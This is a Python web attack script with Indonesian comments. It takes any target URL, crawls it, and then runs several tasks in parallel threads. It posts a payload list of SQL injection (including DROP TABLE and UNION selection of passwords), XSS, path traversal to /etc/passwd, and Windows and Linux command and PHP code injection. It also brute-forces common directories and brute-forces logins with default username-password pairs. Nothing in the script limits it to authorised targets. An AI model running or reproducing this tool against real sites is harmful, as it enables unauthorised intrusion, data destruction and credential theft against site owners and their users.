import requests
from bs4 import BeautifulSoup
import threading
import logging
import itertools

# Daftar payload fuzzing lanjutan untuk eksploitasi tingkat tinggi
fuzz_payloads = [
    "' OR '1'='1",                         # SQL Injection
    "<script>alert(1)</script>",            # XSS
    "../../etc/passwd",                     # Path Traversal
    "'; DROP TABLE users;--",               # SQL Drop Table
    "' AND sleep(5)--",                     # Time-Based SQL Injection
    "'; exec xp_cmdshell('dir');--",        # Command Injection Windows
    "`; ls -la /etc/;`",                    # Command Injection Linux
    "<?php system('cat /etc/passwd'); ?>",  # PHP Code Injection
    "' UNION SELECT username, password FROM users --",  # SQL Union Injection
]

# Daftar direktori bruteforce
common_directories = [
    'admin', 'login', 'dashboard', 'backup', 'config', 'uploads', 'private', 'db', 'data'
]

# Daftar kombinasi username-password untuk bruteforce login
usernames = ['admin', 'user', 'test', 'root']
passwords = ['password', '123456', 'admin', 'root', 'qwerty']

# Konfigurasi log untuk laporan
logging.basicConfig(filename='laporan_keamanan_brutal_terminal.txt', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s', encoding='utf-8')

# Menampilkan dan mencatat ke log sekaligus ke terminal
def log_and_print(message, level="info"):
    print(message)
    if level == "info":
        logging.info(message)
    elif level == "warning":
        logging.warning(message)
    elif level == "error":
        logging.error(message)

# Fungsi timeout handler untuk request
def make_request(url, method='get', data=None, timeout=10):
    try:
        if method == 'get':
            response = requests.get(url, timeout=timeout)
        elif method == 'post':
            response = requests.post(url, data=data, timeout=timeout)
        return response
    except requests.exceptions.Timeout:
        log_and_print(f"Timeout pada {url}.", "warning")
    except requests.exceptions.RequestException as e:
        log_and_print(f"Kesalahan koneksi ke {url}: {e}", "error")
    return None

# Crawling untuk mendapatkan semua URL dalam situs web
def crawl(url):
    urls = set()
    try:
        response = make_request(url)
        if response:
            soup = BeautifulSoup(response.content, 'html.parser')
            for a_tag in soup.find_all('a', href=True):
                link = a_tag['href']
                if link.startswith('http'):
                    urls.add(link)
                else:
                    urls.add(f"{url}/{link}")
    except Exception as e:
        log_and_print(f"Kesalahan saat crawling: {e}", "error")
    return urls

# Fuzzing brutal dengan payload
def fuzz_brutal(url):
    for payload in fuzz_payloads:
        try:
            response = make_request(url, method='post', data={'input': payload})
            if response and response.status_code != 200:
                log_and_print(f"Potensi celah ditemukan di {url} dengan payload: {payload}")
            else:
                log_and_print(f"URL {url} aman dengan payload: {payload}")
        except Exception as e:
            log_and_print(f"Kesalahan saat fuzzing di {url}: {e}", "error")

# Bruteforce pada direktori yang umum digunakan
def bruteforce_directories(url):
    for directory in common_directories:
        full_url = f"{url}/{directory}"
        try:
            response = make_request(full_url)
            if response:
                if response.status_code == 200:
                    log_and_print(f"Direktori terbuka: {full_url}")
                elif response.status_code == 403:
                    log_and_print(f"Akses ditolak (forbidden): {full_url}")
        except Exception as e:
            log_and_print(f"Kesalahan saat bruteforce direktori di {full_url}: {e}", "error")

# Bruteforce login dengan username dan password umum
def bruteforce_login(url):
    login_url = f"{url}/login"  # Pastikan ini sesuai dengan struktur URL login yang tepat
    for username, password in itertools.product(usernames, passwords):
        try:
            response = make_request(login_url, method='post', data={'username': username, 'password': password})
            if response and "login gagal" not in response.text:  # Ganti dengan logika yang sesuai untuk mendeteksi login berhasil
                log_and_print(f"Login berhasil di {login_url} dengan username: {username} dan password: {password}")
            else:
                log_and_print(f"Login gagal di {login_url} dengan username: {username} dan password: {password}")
        except Exception as e:
            log_and_print(f"Kesalahan saat bruteforce login di {login_url}: {e}", "error")

# Cek status code dan error server
def check_status(url):
    try:
        response = make_request(url)
        if response:
            if response.status_code >= 400:
                log_and_print(f"Error terdeteksi: {url} mengembalikan status {response.status_code}", "warning")
            else:
                log_and_print(f"{url} aman dengan status {response.status_code}")
    except Exception as e:
        log_and_print(f"Kesalahan saat cek status di {url}: {e}", "error")

# Fungsi untuk menciptakan bug buatan (dummy bug) untuk menguji sistem keamanan
def create_dummy_bug(url):
    try:
        dummy_payload = "<script>alert('Bug test');</script>"
        response = make_request(url, method='post', data={'input': dummy_payload})
        if response and response.status_code == 200:
            log_and_print(f"Bug uji coba berhasil dikirim ke {url}, periksa respons XSS.")
        else:
            log_and_print(f"Bug uji coba gagal dikirim ke {url}.")
    except Exception as e:
        log_and_print(f"Kesalahan saat menciptakan bug di {url}: {e}", "error")

# Multi-threading untuk eksekusi brutal secara bersamaan
def brute_force_search(urls):
    threads = []
    for url in urls:
        t = threading.Thread(target=check_status, args=(url,))
        t2 = threading.Thread(target=fuzz_brutal, args=(url,))
        t3 = threading.Thread(target=bruteforce_directories, args=(url,))
        t4 = threading.Thread(target=bruteforce_login, args=(url,))
        t5 = threading.Thread(target=create_dummy_bug, args=(url,))
        threads.append(t)
        threads.append(t2)
        threads.append(t3)
        threads.append(t4)
        threads.append(t5)
        t.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()

    for thread in threads:
        thread.join()

# Eksekusi program
if __name__ == "__main__":
    target_url = input("Zamur Masukkan URL target: ")  # Masukkan URL secara manual
    log_and_print(f"Memulai pencarian brutal pada {target_url}")
    
    # Crawling untuk menemukan semua URL
    all_urls = crawl(target_url)
    log_and_print(f"URL yang ditemukan: {all_urls}")
    
    # Melakukan brute-force pengecekan bug dan kerentanan
    brute_force_search(all_urls)

    log_and_print("Pencarian brutal selesai.")
    log_and_print("Laporan selesai dibuat dan dapat diperiksa di laporan_keamanan_brutal_terminal.txt.")
